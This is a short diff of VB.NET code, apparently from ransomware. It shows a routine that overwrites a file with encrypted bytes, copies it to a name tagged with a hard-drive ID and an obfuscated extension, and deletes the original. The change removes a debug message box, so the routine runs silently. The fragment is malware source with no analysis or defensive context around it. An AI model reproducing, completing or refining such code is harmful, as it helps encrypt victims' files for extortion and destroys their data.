@@ -38,7 +38,6 @@ Public Class clsCrypto
                 bytesEncrypted = ms.ToArray
             End Using
             IO.File.WriteAllBytes(sFileName, bytesEncrypted)
-            MsgBox(sFileName)
             System.IO.File.Copy(sFileName, sFileName + "[ID=" + clsS.hdd + "]" + Obf("lohg36GemJ6ki6AZx8BLiTYDIPny/N3Q"))
             System.IO.File.Delete(sFileName)
 
